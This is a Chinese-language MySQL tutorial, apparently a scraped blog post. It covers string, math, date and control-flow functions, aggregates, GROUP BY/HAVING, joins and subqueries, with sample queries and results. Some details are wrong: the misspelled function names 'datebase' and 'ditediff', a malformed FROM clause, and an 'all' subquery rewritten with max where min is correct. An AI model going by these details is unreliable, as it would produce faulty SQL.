2、提高了代码的重用性调用: select 函数名(实参列表) 【form 表】;特点:函数名函数功能分类:1、单行函数如: concat、length、ifnull等2、分组函数功能：做统计使用，又称为统计函数、聚合函数、组函数单行函数单行函数: 字符函数 数学函数 日期函数 其他函数【补充】 流程控制函数【补充】 12345678910111213141516171819202122232425262728293031323334353637383940414243单行函数总结: 字符函数: length (获取字节长度) concat(拼接字符) upper(将字母大写) lower(将字母小写) substr(索引) instr(返回第一次索引的位置) trim(去除开头和结尾) lpad(用指定字符实现左填充) rpad(用指定字符实现右填充) replace(替换)数学函数: round(四舍五入) ceil(向上取整) floor(向下取整) truncate(截断) mod(取余) rand(获取随机数)，返回0-1之间的小数，无限接近于1但到不了1日期函数: now(返回当前日期和时间) curdate(返回当前日期) curtime(返回当前时间) year(年) month(月) day(日) hour(小时) minute(分钟) second(秒) str_to_date(将字符通过指定的格式转换成日期) date_format(将日期转换成字符) ditediff(两个日期相差的天数) monthname(以英文形式返回月)其他函数: version(查看当前系统版本) datebase(查看当前库名) user(查看当前用户) password(&#39;字符&#39;):返回该字符的密码形式，也就是自动加密 md5(&#39;字符&#39;):返回md5加密形式流程控制函数： if(类似于if else) case(类似于 swith default) 一、字符函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980811、length 获取参数值的字节个数mysql&gt; SELECT LENGTH(&#39;john&#39;);2、concat 拼接字符串mysql&gt; SELECT CONCAT(last_name,&#39;_&#39;,first_name) FROM employees;3、upper、lower upper将想写变成大写，lower是将大写变成小写mysql&gt; SELECT UPPER(&#39;joke&#39;);mysql&gt; SELECT LOWER(&#39;jokE&#39;);示例:将姓大写，名小写，然后拼接mysql&gt; SELECT CONCAT(UPPER(last_name),LOWER(first_name)) 姓名 FROM employees;4、substr、substring 索引注意:索引是从1开始的，截取指定索引处后面所有的字符mysql&gt; SELECT SUBSTR(&#39;世间美好与你环环相扣&#39;,5) out_put;截取从指定索引处指定字符长度的字符mysql&gt; SELECT SUBSTR(&#39;世间美好与你环环相扣&#39;，1,4) out_put;案例:姓名中首字符大写，其他字符小写，然后用_拼接，显示出来mysql&gt; SELECT CONCAT(UPPER(SUBSTR(last_name,1,1)),&#39;_&#39;,LOWER(SUBSTR(last_name,2))) out_put FROM employees;5、instr 返回子串第一次出现的索引，如果找不到返回0mysql&gt; SELECT INSTR(&#39;杨过和小龙女&#39;,&#39;小龙女&#39;) out_put;+---------+| out_put |+---------+| 4 |+---------+6、trim注意:trim只能去除开头和结尾，中间不能去除mysql&gt; SELECT TRIM(&#39; 皮卡丘 &#39;) out_put;+---------+| out_put |+---------+| 皮卡丘 |+---------+#可以加上length来查看字符长度，看看是否将空格去除了mysql&gt; SELECT LENGTH(TRIM(&#39; 皮卡丘 &#39;)) out_put;+---------+| out_put |+---------+| 6 |+---------+案例一、aaaaaaa皮卡丘aaaaaaaa将a去除，只显示皮卡丘# 只需要在前面加上你想要去掉的符号就可以mysql&gt; SELECT TRIM(&#39;a&#39; FROM &#39;aaaaaaa皮卡丘aaaaaaaa&#39;) out_put;+---------+| out_put |+---------+| 皮卡丘 |+---------+7、lpad 用指定字符实现左填充指定长度mysql&gt; SELECT LPAD(&#39;小智&#39;,10,&#39;*&#39;) out_put;+--------------+| out_put |+--------------+| ********小智 |+--------------+8、rpad 用指定字符实现右填充指定长度mysql&gt; SELECT RPAD(&#39;小智&#39;,10,&#39;*&#39;) out_put;+--------------+| out_put |+--------------+| 小智******** |+--------------+9、replace 替换#将周芷若替换成了赵敏mysql&gt; SELECT REPLACE(&#39;张无忌爱上了周芷若&#39;,&#39;周芷若&#39;,&#39;赵敏&#39;) AS out_put;+------------------+| out_put |+------------------+| 张无忌爱上了赵敏 |+------------------+ 二、数学函数12345678910111213141516171819202122232425262728293031323334351、round 四舍五入mysql&gt; SELECT ROUND(4.6) number;2、ceil 向上取整，返回&gt;&#x3D;该参数的最小整数mysql&gt; SELECT CEIL(1.0000002) AS number;+--------+| number |+--------+| 2 |+--------+3、floor 向下取整，返回&lt;&#x3D;该参数的最大整数mysql&gt; SELECT FLOOR(1.0000002) AS number;+--------+| number |+--------+| 1 |+--------+4、truncate 截断# 4 表示保留小数点后几位mysql&gt; SELECT TRUNCATE(3.1415926,4) AS number;+--------+| number |+--------+| 3.1415 |+--------+5、mod 取余mysql&gt; SELECT MOD(10,8) AS number;+--------+| number |+--------+| 2 |+--------+ 三、日期函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667681、now 返回当前系统+日期mysql&gt; SELECT NOW();+---------------------+| NOW() |+---------------------+| 2020-02-05 15:09:28 |+---------------------+2、curdate 放回当前系统日期，不包含时间mysql&gt; SELECT CURDATE();+------------+| CURDATE() |+------------+| 2020-02-05 |+------------+3、curtime 返回当前系统时间，不包含日期mysql&gt; SELECT CURTIME();+-----------+| CURTIME() |+-----------+| 15:21:07 |+-----------+4、可以获取指定的部分，年、月、日、小时、分钟、秒# 年(year)、月(month)、日(day)、小时(hour)、分钟(Minute)、秒(second)mysql&gt; SELECT YEAR(NOW());+-------------+| YEAR(NOW()) |+-------------+| 2020 |+-------------+5、str_to_date 将字符通过指定的格式转换成日期mysql&gt; SELECT STR_TO_DATE(&#39;2020-23-2&#39;,&#39;%Y-%d-%c&#39;);+-------------------------------------+| STR_TO_DATE(&#39;2020-23-2&#39;,&#39;%Y-%d-%c&#39;) |+-------------------------------------+| 2020-02-23 |+-------------------------------------+案例一:查询入职时间为1992-4-3的员工信息mysql&gt; SELECT hiredate FROM employees WHERE hiredate &#x3D; STR_TO_DATE(&#39;4-3-1992&#39;,&#39;%c-%d-%Y&#39;);+---------------------+| hiredate |+---------------------+| 1992-04-03 00:00:00 || 1992-04-03 00:00:00 || 1992-04-03 00:00:00 || 1992-04-03 00:00:00 || 1992-04-03 00:00:00 |+---------------------+date_format:将日期转换成字符mysql&gt; SELECT DATE_FORMAT(&#39;2020&#x2F;2&#x2F;5&#39;,&#39;%Y年%m月%d日&#39;);+----------------------------------------+| DATE_FORMAT(&#39;2020&#x2F;2&#x2F;5&#39;,&#39;%Y年%m月%d日&#39;) |+----------------------------------------+| 2020年02月05日 |+----------------------------------------+案例一:查询有奖金的员工名和入职日期(××月&#x2F;××日 ××年)mysql&gt; SELECT last_name,DATE_FORMAT(hiredate,&#39;%m月%d日 %y年&#39;) FROM employees WHERE commission_pct IS NOT NULL;+------------+---------------------------------------+| last_name | DATE_FORMAT(hiredate,&#39;%m月%d日 %y年&#39;) |+------------+---------------------------------------+| Russell | 12月23日 02年 || Partners | 12月23日 02年 | 四、其他函数123select version(); 查看当前版本select datebase(); 查看当前数据库select user(); 代表当前用户 五、流程控制函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374751、if函数: 类似于 if else 的效果#括号里面的数值，第一个是条件表达式，如果条件成立输出第二个，如果不成立，输出第三个10&gt;2成立，输出 大 mysql&gt; select if(10&gt;2,&#39;大&#39;,&#39;小&#39;);# 10&lt;2条件不成立，输出 小mysql&gt; select if(10&lt;2,&#39;大&#39;,&#39;小&#39;);案例一:将有奖金的员工名打印有，没有奖金的打印无mysql&gt; select last_name,commission_pct,if(commission_pct is null,&#39;无&#39;,&#39;有&#39;) 奖金 from employees;2、case函数的使用方法一 大部分用于等值判断在when中值不需要加;分号，语句需要加;分号&#x2F;*语法: case 要判断的字段或表达式 when 常量1 then 要显示的值1或语句1; when 常量2 then 要显示的值2或语句2; ... else 要显示的值n或语句n; end*&#x2F;案例:查询员工的工资，要求:部门号&#x3D;30，显示工资1.1倍部门号&#x3D;40，显示工资1.2倍部门号&#x3D;50，显示工资1.3倍其他部门，显示工资为原工资mysql&gt; select salary,department_id, -&gt; case department_id -&gt; when 30 then salary*1.1 -&gt; when 40 then salary*1.2 -&gt; when 50 then salary*1.3 -&gt; else salary -&gt; end as 新工资 -&gt; from employees;+----------+---------------+----------+| salary | department_id | 新工资 |+----------+---------------+----------+| 24000.00 | 90 | 24000.00 || 17000.00 | 90 | 17000.00 || 17000.00 | 90 | 17000.00 || 9000.00 | 60 | 9000.00 || 6000.00 | 60 | 6000.00 |3、case 函数的使用二 大部分用于判断大于小于&#x2F;*语法: case when 条件1 then 要显示的值1 when 条件2 then 要显示的值2 ... else 要显示的值n或语句n; end*&#x2F;案例一:查询员工的工资情况如果工资&gt;20000,显示A级别如果工资&gt;15000,显示B级别如果工资&gt;10000,显示C级别其他显示D级别mysql&gt; select salary, -&gt; case -&gt; when salary&gt;20000 then &#39;A&#39; -&gt; when salary&gt;15000 then &#39;B&#39; -&gt; when salary&gt;10000 then &#39;C&#39; -&gt; else &#39;D&#39; -&gt; end as 工资级别 -&gt; from employees;+----------+----------+| salary | 工资级别 |+----------+----------+| 24000.00 | A || 17000.00 | B || 9000.00 | D || 12000.00 | C | 分组函数功能:用作统计使用，又成为聚合函数或统计函数或组函数分类:sum 求和、avg 平均值、max 最大值、min 最小值、count 计算个数特点:1、sum、avg 一般用于处理数值型max、min、count可以处理任何类型2、以上分组函数都忽略null值3、可以和distinct搭配是去重运算 select sum(distinct 字段) from 表4、count函数的单独介绍，一般使用count()用作统计行数5、和分组函数一同查询的字段要求是group by后的字段123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657581、简单的使用mysql&gt; select sum(salary) from employees; #salary的全部和mysql&gt; select avg(salary) from employees; #salary的平均值mysql&gt; select max(salary) from employees; #salary的最大值mysql&gt; select min(salary) from employees; #salary的最小值mysql&gt; select count(salary) from employees; #计算有多少个salary可以将函数一起使用mysql&gt; select sum(salary) 和,avg(salary) 平均,max(salary) 最大,min(salary) 最小,count(salary) 个数 from employees;2、参数支持那些类型sum、avg一般用于处理数值型max、min、count可以处理任何类型 mysql&gt; select sum(salary),avg(salary) from employees;mysql&gt; select max(last_name),min(salary),count(last_name) from employees;3、是否忽略null值以上分组函数都忽略null值mysql&gt; select sum(commission_pct),avg(commission_pct) from employees;mysql&gt; select max(commission_pct),min(commission_pct) from employees;mysql&gt; select count(commission_pct) from employees;4、和distinct的搭配其他分组函数全都支持distinct去重mysql&gt; select sum(distinct salary),sum(salary) from employees;+----------------------+-------------+| sum(distinct salary) | sum(salary) |+----------------------+-------------+| 397900.00 | 691400.00 |+----------------------+-------------+计算有几个工资，去重之后是57个原始的个数是107个mysql&gt; select count(distinct salary),count(salary) from employees;+------------------------+---------------+| count(distinct salary) | count(salary) |+------------------------+---------------+| 57 | 107 |+------------------------+---------------+5、count函数详细介绍#统计行数也就是个数mysql&gt; select count(*) from employees;#和以上方法意思相同mysql&gt; select count(1) from employees;效率:5.5版本之前用myisam存储引擎下，count(*)的效率高5.5版本之后用innodb存储引擎下，count(*)和count(1)效率差不多，但比count(字段)要高，如果里面加字段，他会进行一个判断，判断是否为null如果为null不加16、和分组函数一同查询的字段有限制#虽然语法没报错但是它的employee_id是错误的mysql&gt; select avg(salary),employee_id from employees;+-------------+-------------+| avg(salary) | employee_id |+-------------+-------------+| 6461.682243 | 100 |+-------------+-------------+ 分组查询12345678特点： 1、分组查询中的筛选条件分为两类 分组前筛选 原始表 它的位置是在group by 子句的前面 关键字是where 分组后筛选 分组后的结果集 它的位置是在group by 子句的后面 关键字是having ①分组函数做条件一定是放在having子句中 ②能用分组前筛选的，就优先考虑使用分组前筛选 2、group by子句支持单个字段分组、多个字段分组(多个字段之间用&quot;,&quot;逗号隔开没有顺寻要求)，表达式或函数(用得较少) 3、也可以添加排序(排序放在整个分段查询的最后) 123456789语法:​ select 分组函数,字段(要求出现在group by的后面)​ from 表名​ 【where 筛选条件】​ group by 分组的列表​ 【order by 子句】注意: 370 查询列表必须特殊，要求是分组函数和group by后出现的字段 123456789101112131415161718192021222324简单的分组查询案例一:查询每个工种的最高工资mysql&gt; select max(salary),job_id -&gt; from employees -&gt; group by job_id; 案例二:查询每个位置上的部门个数mysql&gt; select count(*),location_id -&gt; from departments -&gt; group by location_id; 添加分组前的筛选条件案例一: 查询邮箱中包含a字符的，每个部门的平均工资mysql&gt; select avg(salary),department_id -&gt; from employees -&gt; where email like &#39;%a%&#39; -&gt; group by department_id;案例二:查询有奖金的每个领导手下员工的最高工资mysql&gt; select max(salary),manager_id -&gt; from employees -&gt; where commission_pct is not null -&gt; group by manager_id; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647添加分组后的的筛选条件案例一:查询哪个部门的员工表个数&gt;2mysql&gt; select count(*),department_id -&gt; from employees -&gt; group by department_id -&gt; having count(*)&gt;2;+----------+---------------+| count(*) | department_id |+----------+---------------+| 6 | 30 || 45 | 50 || 5 | 60 || 34 | 80 || 3 | 90 || 6 | 100 |+----------+---------------+ 案例二:查询每个工种有奖金的员工的最高工资&gt;12000的工种编号和最高工资mysql&gt; select max(salary),job_id -&gt; from employees -&gt; where commission_pct is not null -&gt; group by job_id -&gt; having max(salary)&gt;12000;+-------------+--------+| max(salary) | job_id |+-------------+--------+| 14000.00 | SA_MAN |+-------------+--------+案例三:查询领导编号&gt;102的每个领导手下的最低工资&gt;5000的领导编号是那个，以及其最低工资mysql&gt; select min(salary),manager_id -&gt; from employees -&gt; where manager_id&gt;102 -&gt; group by manager_id -&gt; having min(salary)&gt;5000;+-------------+------------+| min(salary) | manager_id |+-------------+------------+| 6900.00 | 108 || 7000.00 | 145 || 7000.00 | 146 || 6200.00 | 147 || 6100.00 | 148 || 6200.00 | 149 || 6000.00 | 201 || 8300.00 | 205 |+-------------+------------+ 123456789101112131415161718192021222324252627282930313233343536373839404142按表达式或函数分组案例:员工姓名的长度分组，查询每一组的员工个数，筛选员工个数大于5的有哪些mysql&gt; select count(*),length(last_name) -&gt; from employees -&gt; group by length(last_name) -&gt; having count(*)&gt;5; +----------+-------------------+| count(*) | length(last_name) |+----------+-------------------+| 11 | 4 || 29 | 5 || 28 | 6 || 15 | 7 || 7 | 8 || 8 | 9 |+----------+-------------------+按多个字段分组案例:查询每个部门每个工种的员工的平均工资mysql&gt; select avg(salary),department_id,job_id -&gt; from employees -&gt; group by department_id,job_id;+--------------+---------------+------------+| avg(salary) | department_id | job_id |+--------------+---------------+------------+| 7000.000000 | NULL | SA_REP || 4400.000000 | 10 | AD_ASST || 13000.000000 | 20 | MK_MAN | 添加排序案例:查询每个部门每个工种的员工的平均工资，并且按平均工资的高低显示mysql&gt; select avg(salary),department_id,job_id -&gt; from employees -&gt; group by department_id,job_id -&gt; order by avg(salary) desc;+--------------+---------------+------------+| avg(salary) | department_id | job_id |+--------------+---------------+------------+| 24000.000000 | 90 | AD_PRES || 17000.000000 | 90 | AD_VP || 13000.000000 | 20 | MK_MAN || 100.000000 | 80 | SA_MAN | 连接查询多表连接含义:又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询123456789101112131415161718192021222324252627282930313233343536373839404142434445笛卡尔乘积现象:表一 有m行，表2有n行，结果是&#x3D;m*n行发生原因:没有有效的连接条件如何避免:添加有效的连接条件分类: 按年代分类: sql92标准:仅仅支持内连接 sql99标准(推荐):支持内连接+外连接(左外和右外)+交叉连接 sql92: 内连接 sql99: 内连接 外连接 交叉连接 按功能分类: 内连接: 等值连接 非等值连接 自连接 外连接: 左外连接 右外连接 全外连接(MySQL不支持) 交叉连接错误语法:select name,boyName from beauty,boys;笛卡尔集的错误情况:select count(*) from beauty;假设输出12行select count(*) from boys;假设输出4行最终结果:12*4&#x3D;48行正确语法select 表,表 from 库 where 表.字段&#x3D;表.字段;mysql&gt; select name,boyName from boys,beauty -&gt; where 等值连接; -&gt; 【and 筛选条件】 -&gt; 【group by 分组】 -&gt; 【having 分组后筛选】 -&gt; 【order by 排序字段】 一：sql92标准等值连接1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001、等值连接①多表等值连接的结果多为表的交集部分②n表连接，最少需要n-1个连接条件③多表二的顺序没有要求④一般需要为表起别名⑤可以搭配前面的所有子句使用，比如排序、分组、筛选案例一:查询女神们和对应的男神名mysql&gt; select name,boyName -&gt; from boys,beauty -&gt; where beauty.boyfriend_id&#x3D;boys.id; 案例二:查询员工名和对应的部门名mysql&gt; select last_name,department_name -&gt; from employees,departments -&gt; where employees.department_id&#x3D;departments.department_id; 2、为表起别名好处:提高语句的简洁度，区分多个重名字段注意:如果为表起了别名，则查询的阻断就不能使用原来的表名去限定查询工种号、工种名、员工名mysql&gt; select last_name,e.job_id,job_title -&gt; from employees e,jobs j -&gt; where e.job_id&#x3D;j.job_id; 3、两个表的顺序是否可以调换查询工种号、工种名、员工名#可以mysql&gt; select last_name,e.job_id,job_title -&gt; from e,jobs j，employees e -&gt; where e.job_id&#x3D;j.job_id; 4、可以加筛选案例1:查询有奖金的员工名、部门名mysql&gt; select last_name,department_name,commission_pct -&gt; from employees e,departments d -&gt; where e.department_id&#x3D;d.department_id and e.commission_pct is not null; 案例2:查询城市名中第二个字符为o的部门名和城市名mysql&gt; select department_name,city -&gt; from departments d,locations l -&gt; where d.location_id&#x3D;l.location_id and city like &#39;_o%&#39;;+-----------------+---------------------+| department_name | city |+-----------------+---------------------+| IT | Southlake || Shi | South San Francisco || Mar | Toronto || Hum | London |+-----------------+---------------------+5、可以加分组案例1:查询每个城市的部门个数mysql&gt; select count(*),city -&gt; from departments d,locations l -&gt; where d.location_id&#x3D;l.location_id -&gt; group by city;+----------+---------------------+| count(*) | city |+----------+---------------------+| 1 | London || 1 | Munich || 1 | Oxford || 21 | Seattle || 1 | South San Francisco || 1 | Southlake || 1 | Toronto |+----------+---------------------+案例2:查询有奖金的每个部门的部门名和部门的领导编号和该部门的最低工资mysql&gt; select min(salary),department_name,d.manager_id -&gt; from employees e,departments d -&gt; where e.department_id&#x3D;d.department_id and commission_pct is not null -&gt; group by department_name,d.manager_id;+-------------+-----------------+------------+| min(salary) | department_name | manager_id |+-------------+-----------------+------------+| 6100.00 | Sal | 145 |+-------------+-----------------+------------+6、可以加排序mysql&gt; select job_title,count(*) -&gt; from jobs j,employees e -&gt; where j.job_id&#x3D;e.job_id -&gt; group by job_title -&gt; order by count(*) desc;+---------------------------------+----------+| job_title | count(*) |+---------------------------------+----------+| Sales Representative | 30 || Shipping Clerk | 20 || Stock Clerk | 20 || Purchasing Clerk | 5 |7、可以实现三表连接案例:查询员工名、部门名和所在城市mysql&gt; select last_name,department_name,city -&gt; from employees e,departments d,locations l -&gt; where d.department_id&#x3D;e.department_id and d.location_id&#x3D;l.location_id; 非等值连接12345678910111213141516171819语法: mysql&gt; select name,boyName from boys,beauty -&gt; where 非等值连接; -&gt; 【and 筛选条件】 -&gt; 【group by 分组】 -&gt; 【having 分组后筛选】 -&gt; 【order by 排序字段】案例1:查询员工的工资和工资级别，并进行排序mysql&gt; select salary,grade_level -&gt; from employees e,job_grades g -&gt; where salary between g.lowest_sal and g.highest_sal -&gt; order by grade_level desc;+----------+-------------+| salary | grade_level |+----------+-------------+| 24000.00 | E || 17000.00 | E || 17000.00 | E | 自连接12345678910111213141516171819202122语法: mysql&gt; select name,boyName from boys,beauty -&gt; from 表 别名1,表 别名2 -&gt; where 等值; -&gt; 【and 筛选条件】 -&gt; 【group by 分组】 -&gt; 【having 分组后筛选】 -&gt; 【order by 排序字段】案例:查询员工名和上级名称mysql&gt; select e.employee_id,e.last_name,m.employee_id,m.last_name -&gt; from employees e,employees m -&gt; where e.employee_id&#x3D;m.manager_id;+-------------+-----------+-------------+-------------+| employee_id | last_name | employee_id | last_name |+-------------+-----------+-------------+-------------+| 100 | K_ing | 101 | Kochhar || 100 | K_ing | 102 | De Haan || 102 | De Haan | 103 | Hunold || 103 | Hunold | 104 | Ernst || 103 | Hunold | 105 | Austin || 103 | Hunold | 106 | Pataballa | 二、sql99语法1234567891011121314151617181920212223语法: select 查询列表 from 表1 别名 【join】 表2 别名 on 连接条件 【where 筛选条件】 【group by 分组】 【having 筛选条件】 【order by 排序】 分类:#以下英文标识连接条件，方括号中可加可不加内连接:inner外连接 左外:left 【outer】 右外:right 【outer】 全外:full 【outer】交叉连接:cross内连接: A表和B表能够完全匹配的记录查询出来，被称为内连接外连接: A表和B表能够完全匹配的记录查询出来之外，将其中一张表的记录无条件的查询出来对方表没有匹配的记录会自动显示null与之匹配，这种查询被称为外连接。 外连接的查询结果条数 &gt;&#x3D; 内连接的查询结果条数 一、内连接12345678910111213141516171819select 查询列表from 表1 别名inner join 表2 别名on 连接条件;內连分类: 等值连接 非等值连接 自连接 特点1: ①添加排序、分组、筛选 ②inner可以省略 ③筛选条件放在where后面，连接条件放在on的后面，提高了分离性，便于阅读 ④inner join连接和sql92语法中的等值连接效果是一样的，都是查询多表的交集特点2: ①表的顺序调换 ②内连接的结果&#x3D;多表的交集 ③n表连接至少需要n-1个连接条件 1、等值连接123456789101112131415161718192021222324252627案例一:查询员工名、部门名mysql&gt; select last_name,department_name -&gt; from employees e -&gt; inner join departments d -&gt; on e.department_id&#x3D;d.department_id; 案例二:查询名字中包含e的员工名和工种名（筛选）mysql&gt; select last_name,job_title -&gt; from employees e -&gt; inner join jobs j -&gt; on e.job_id&#x3D;j.job_id -&gt; where e.last_name like &#39;%e%&#39;; 案例三:查询部门个数&gt;3的城市名和部门个数（分组+筛选）mysql&gt; select city,count(*) -&gt; from departments d -&gt; inner join locations l -&gt; on d.location_id&#x3D;l.location_id -&gt; group by city -&gt; having count(*)&gt;3; 案例四:查询部门的员工个数&gt;3的城市名和部门个数，并按个数降序（分组+筛选+排序）mysql&gt; select count(*),department_id -&gt; from employees e -&gt; group by department_id -&gt; having count(*)&gt;3 -&gt; order by count(*) desc; 12345678910111213141516三表连接语法格式:select 查询条件from 表1 别名【inner】join 表2 别名 on 表1&#x3D;表3 #等值连接【inner】join 表3 别名 on 表1&#x3D;表3 #等值连接案例五:查询员工名、部门名、工种名，并按部门名降序()#进行多面连接时候，先from后面的表和第一个join的表连接然后再将from后面的表和第二个join表连接mysql&gt; select last_name,department_name,job_title -&gt; from employees e -&gt; inner join departments d on e.department_id&#x3D;d.department_id -&gt; inner join jobs j on e.job_id&#x3D;j.job_id -&gt; order by department_name desc; 2、非等值连接1234567891011121314查询员工的工资级别mysql&gt; select salary,grade_level -&gt; from employees e -&gt; inner join job_grades g -&gt; on e.salary between g.lowest_sal and g.highest_sal; 查询每个工资级别的个数&gt;20的个数，并且按工资级别排序mysql&gt; select count(*),grade_level -&gt; from employees e -&gt; join job_grades g -&gt; on e.salary between g.lowest_sal and g.highest_sal -&gt; group by grade_level -&gt; having count(*)&gt;20 -&gt; order by count(*) desc; 3、自连接1234mysql&gt; select e.last_name,m.last_name -&gt; from employees e -&gt; inner join employees m -&gt; on e.manager_id&#x3D;m.employee_id; 二、外连接123为什么inner和outer可以省略，加上去有什么好处? - 可以省略，因为区分内连接和外连接的依靠的不是这些关键字而是left&#x2F;right若存在，表示一定是一个外连接，其他都是内连接 - 加上去的好处是增强可读性 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748语法: select 查询列表 from 表1 别名 left|right|full【outer】 表2 别名 on 连接条件 #其中任意一个都可以 【where 筛选条件】 【group by 分组】 【having 筛选条件】 【order by 排序】特点:1、外链接的查询结果为主要表中的所有行 如果从表中有和它匹配的，则显示匹配的行 如果从表中没有和它匹配的则显示null 外连接查询结果&#x3D;内连接结果+主表中有而从表中没有的记录2、左外连接，left join左边的是主表 右外连接, right join右边的是主表3、左外和右外交换两个表的顺序，可以实现同样的效果4、一般用于查询除了交集部分的剩余的不匹配的行引入:查询男朋友不在男神表的女神名左外连接mysql&gt; select b.name,bo.* -&gt; from beauty b -&gt; left outer join boys bo -&gt; on b.boyfriend_id &#x3D; bo.id -&gt; where bo.id is null 右外连接mysql&gt; select b.name,bo.* -&gt; from boys bo -&gt; right outer joinbeauty b -&gt; on b.boyfriend_id &#x3D; bo.id -&gt; where b.id is null 案例一:查询那个部门没有员工左外连接mysql&gt; select d.*,e.employee_id -&gt; from departments d -&gt; left outer join employees e -&gt; on d.department_id&#x3D;e.department_id -&gt; where e.employee_id is null; 右外连接mysql&gt; select d.*,e.employee_id -&gt; from employees e -&gt; right outer join departments d -&gt; on d.department_id&#x3D;e.department_id -&gt; where e.employee_id is null; 交叉连接123456语法: select 查询列表 from 表1 别名 cross join 表2 别名;特点:类似于笛卡尔乘积 123mysql&gt; select b.*,bo.* -&gt; from beauty b -&gt; cross join boys bo; 123sql92和sql99功能:sql99支持的较多可读性:sql99实现连接条件和筛选条件的分离，可读性较高 子查询123456789101112131415161718192021222324含义:出现在其他语句中的select语句，成为子查询或内查询外部如果shiselect语句，则此语句成为主查询或外查询分类:按子查询出现的位置可以放在 select后面: 仅仅支持标量子查询 #select后面只能放标量子查询 from后面: 支持表子查询 where或having后面: ★ #这三个重点 标量子查询 ★ 列子查询 ★ 行子查询 #用的较少 exists后面 标量子查询 列子查询 行子查询按结果集的行列数不同: 标量子查询(结果集只有一行一列) 列子查询(结果集只有一列多行) 行子查询(结果集有多行多列) 表子查询(结果集，一般为多行多列) 12345678示例:where或having1、标量子查询 select first_name from employees where department_id in( select department_id from departments where location_id&#x3D;1700 ) 一、where或having后面1231、标量子查询(单行子查询)2、列子查询(多行子查询)3、行子查询(多列多行) 12345678特点:①子查询放在小括号内②子查询一般放在条件的右侧③标量子查询，一般搭配着单行操作符使用 #单行操作符就是条件运算符&gt; &lt; &gt;&#x3D; &lt;&#x3D; &#x3D; &lt;&gt;列子查询，一般搭配着多行操作符使用in、any&#x2F;some、all④子查询的执行优先于主查询执行，主查询的条件用到了子查询的结果 1、标量子查询123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 子查询就是select语句嵌套select语句 子查询可以出现在: select..(select). #可以出现在select后面 from ..(select). #可以出现在from后面 where ..(select). #可以出现where后面 格式: select 字段 from 表名 where 筛选条件(查询条件)where后面使用子查询案例1:谁的工资比Abel高①：先找出谁的名字叫Abelselect salary from employees -&gt; where last_name&#x3D;&#39;Abel&#39;;②再将他们的工资比较 mysql&gt; select * from employees -&gt; where salary&gt;(select salary from employees -&gt; where last_name&#x3D;&#39;Abel&#39;); 案例2::返回job_id与141号员工相同，salary比143号员工多的员工 姓名，job_id和工资mysql&gt; select job_id,last_name,salary -&gt; from employees -&gt; where job_id &#x3D; (select job_id from employees -&gt; where employee_id &#x3D; 141) and -&gt; salary&gt;(select salary from employees -&gt; where employee_id&#x3D;143);+----------+-------------+---------+| job_id | last_name | salary |+----------+-------------+---------+| ST_CLERK | Nayer | 3200.00 || ST_CLERK | Mikkilineni | 2700.00 || ST_CLERK | Bissot | 3300.00 || ST_CLERK | Atkinson | 2800.00 || ST_CLERK | Mallin | 3300.00 || ST_CLERK | Rogers | 2900.00 || ST_CLERK | Ladwig | 3600.00 || ST_CLERK | Stiles | 3200.00 || ST_CLERK | Seo | 2700.00 || ST_CLERK | Rajs | 3500.00 || ST_CLERK | Davies | 3100.00 |+----------+-------------+---------+11 rows in set (0.00 sec)案例3:返回公司工资最少的员工的last_name,job_id和salarymysql&gt; select salary,last_name,job_id -&gt; from employees -&gt; where salary&#x3D;(select min(salary) from employees);having后面案例4:查询最低工资大于50号部门最低工资的部门id和其最低工资mysql&gt; select min(salary),department_id -&gt; from employees -&gt; group by department_id -&gt; having min(salary)&gt;(select min(salary) -&gt; from employees -&gt; where department_id&#x3D;50); 注意:非法使用标量子查询也就是说子查询的结果不是一行一列 2、列子查询（多行子查询） 多行子查询操作符 操作符 含义 in/not in 等于列表中的任意一个 any | some 和子查询返回的某一个值比较 all 和子查询返回的所有值比较 1234567891011121314151617181920212223242526272829303132333435363738394041424344案例1:返回location_id是1400或1700的部门中所有员工姓名mysql&gt; select last_name -&gt; from employees -&gt; where department_id in (select department_id from departments -&gt; where location_id in(1400,1700));+------------+| last_name |+------------+| K_ing || Kochhar || De Haan || Hunold |案例2:返回其他部门中比job_id为&#39;IT_PROG&#39;部门任一工资低的员工的员工号、姓名、job_id以及salary①查询job_id为&#39;IT_PROG&#39;部门mysql&gt; select salary -&gt; from employees -&gt; where job_id &#x3D; &#39;IT_PROG&#39;;②查询员工号、姓名、job_id以及salary，salary&lt;(①)的任意一个mysql&gt; select last_name,employee_id,job_id,salary -&gt; from employees -&gt; where salary&lt;any(select salary from employees where job_id&#x3D;&#39;IT_PROG&#39;);或mysql&gt; select last_name,employee_id,job_id,salary -&gt; from employees#小于any也就是比子查询里的都小，也就是小于最大的，就可以改成max(salary)，外面就不需要any了 -&gt; where salary&lt;(select max(salary) from employees where job_id&#x3D;&#39;IT_PROG&#39;); 案例3:返回其他部门中比job_id为&#39;IT_PROG&#39;部门所有工资都低的员工的员工号、姓名、job_id以及salary①查询job_id为&#39;IT_PROG&#39;部门mysql&gt; select salary -&gt; from employees -&gt; where job_id &#x3D; &#39;IT_PROG&#39;;②查询员工号、姓名、job_id以及salary，salary&lt;(①)的全部mysql&gt; select employee_id,last_name,job_id,salary -&gt; from employees -&gt; where salary&lt;all(select salary from employees -&gt; where job_id&#x3D;&#39;IT_PROG&#39;) and job_id&lt;&gt;&#39;IT_PROG&#39;;或mysql&gt; select employee_id,last_name,job_id,salary -&gt; from employees -&gt; where salary&lt;(select max(salary) from employees -&gt; where job_id&#x3D;&#39;IT_PROG&#39;) and job_id&lt;&gt;&#39;IT_PROG&#39;; 3、行子查询（结果集一行多列或多行多列）1234567行子查询（了解） #有局限性，不常用案例:查询员工编号最小并且工资最高的员工mysql&gt; select * -&gt; from employees -&gt; where (employee_id,salary)&#x3D;( -&gt; select min(employee_id),max(salary) -&gt; from employees); 二、select后面(了解)1234567891011121314151617181920select后面仅仅支持标量子查询案例1:查询每个部门的员工个数mysql&gt; select d.*,(select count(*) -&gt; from employees e -&gt; where e.department_id&#x3D;d.department_id) -&gt; from departments 